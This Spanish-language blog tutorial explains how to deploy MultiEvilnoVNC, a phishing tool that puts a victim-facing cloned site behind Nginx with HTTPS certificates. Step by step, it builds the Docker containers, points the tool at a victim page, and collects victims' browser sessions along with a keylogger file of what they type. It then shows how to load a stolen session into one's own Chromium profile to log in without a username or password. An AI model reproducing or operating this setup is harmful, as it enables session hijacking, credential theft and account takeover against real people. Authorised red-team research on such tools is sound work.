---
title: Configuración de MultiEvilnoVNC con HTTPS
description: Esta guía proporciona instrucciones detalladas para configurar MultiEvilNoVNC, incluyendo la preparación de contenedores Docker, configuración de Nginx, obtención de certificados SSL con Certbot, y modificación del script de inicio para asegurar el funcionamiento adecuado. Además, cubre cómo ejecutar la herramienta y gestionar y visualizar sesiones de sitios web visitados por usuarios.
snippetone: Herramientas
category: Herramientas
SEOTitle: MultiEvilnoVNC
lang: es
date: 2024-07-18
---



![Application Logo](/static/blog/img/MultiEvilnoVNC.png)

### Introducción

En esta guía, vamos a configurar una herramienta llamada [MultiEvilNoVNC](https://github.com/wanetty/MultiEvilnoVNC). Este tutorial cubrirá la configuración de Nginx, obtención de certificados SSL con Certbot, preparación de contenedores Docker, y modificación del script de inicio para asegurar el funcionamiento adecuado.

### Requisitos

Antes de comenzar, asegúrate de tener lo siguiente:

1. Un dominio de prueba (ej. `testdomain.com`).
2. Docker instalado en tu sistema.
3. Certbot instalado para obtener certificados SSL.


### Paso 1: Preparación de los Contenedores Docker

Primero, debes montar los contenedores Docker. Esto se puede hacer de dos maneras:

#### Método Automático:

```bash
git clone https://github.com/wanetty/MultiEvilnoVNC.git
cd EvilnoVNC
make build
```

#### Método manual:

```bash
git clone https://github.com/wanetty/MultiEvilnoVNC.git
cd EvilnoVNC
sudo chown -R 103 Downloads
sudo docker build -f evilnovnc.Dockerfile -t evilnovnc .
sudo docker build -f nginx.Dockerfile -t evilnginx .
```


### Paso 2: Configuración de Nginx para HTTPS

A continuación, configura Nginx para manejar solicitudes HTTP y HTTPS. Crea un archivo de configuración en `Files/default.conf` con el siguiente contenido:

```nginx
server {
    listen       80;
    listen  [::]:80;
    server_name  testdomain.com;

    # Redirección de HTTP a HTTPS
    return 301 https://$server_name$request_uri;
}

server {
    listen       443 ssl http2;
    listen  [::]:443 ssl http2;
    server_name  testdomain.com;

    ssl_certificate /certs/fullchain.pem;
    ssl_certificate_key /certs/privkey.pem;

    # Configuraciones SSL
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_prefer_server_ciphers on;
    ssl_ciphers 'EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH';
    ssl_session_cache shared:SSL:10m;
    ssl_session_timeout 10m;

    access_log  /var/log/nginx/testdomain.access.log;
    error_log   /var/log/nginx/testdomain.error.log;

    location / {
        root   /usr/share/nginx/html;
        index  index.html index.htm;
    }

    location /reso {
        proxy_pass   http://127.0.0.1:8080;
    }
}
```

### Paso 3: Obtención de Certificados SSL

Para asegurar la comunicación HTTPS, necesitas obtener certificados SSL. Usaremos Certbot para este propósito. Ejecuta el siguiente comando:

```bash
sudo certbot certonly --standalone --preferred-challenges http -d testdomain.com
```
![Archivos de certificado](/static/blog/img/multivnc_cert1.png)

> **Advertencia:** Puedes obtener los certificados de otra manera si lo prefieres.

### Paso 4: Modificación del Script de Inicio

El script de inicio `start_auto.sh` necesita ser modificado para configurar Docker y copiar los certificados a la ubicación correcta. A continuación se muestra un extracto del script con las modificaciones indicadas en la imagen proporcionada:

![Modificaciones de start_auto.sh](/static/blog/img/multivnc_startauto.png)


### Paso 5: Ejecutar la herramienta

Finalmente, ejecuta la herramienta usando el siguiente comando:

```bash
./start_auto.sh https://clone.victim.page.com
```

### Después de la ejecución

En la carpeta `Downloads`, encontrarás las sesiones de los sitios web que han sido visitados por usuarios. Estas sesiones están identificadas por el mismo identificador que el sitio web. Además, dentro de cada sesión, hay un archivo llamado `keylogger` que contiene el texto escrito por la víctima.

Si quieres abrir las sesiones en un navegador, puedes hacerlo copiando el contenido de una de las sesiones a tu configuración de Chromium de la siguiente manera (reemplaza `SESSION_ID` con el identificador de la sesión que quieres abrir):

```bash
cp -R Downloads/SESSION_ID ~/.config/chromium/
```

Luego, ejecuta Chromium con el siguiente comando:

```bash
/bin/bash -c "/usr/bin/chromium --no-sandbox --disable-crash-reporter --password-store=basic &" > /dev/null 2>&1 &
```
Después de eso, abre Chromium y navega al sitio web de la víctima. Deberías poder iniciar sesión sin necesidad de introducir un nombre de usuario y contraseña.

### Otros sitios relacionados

* [Blog de Darkbyte](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)

* [Inspiración para multisesiones](https://datawookie.dev/blog/2021/08/websockify-novnc-behind-an-nginx-proxy/)

* [Guía oficial de nginx vía https](https://nginx.org/en/docs/http/configuring_https_servers.html)

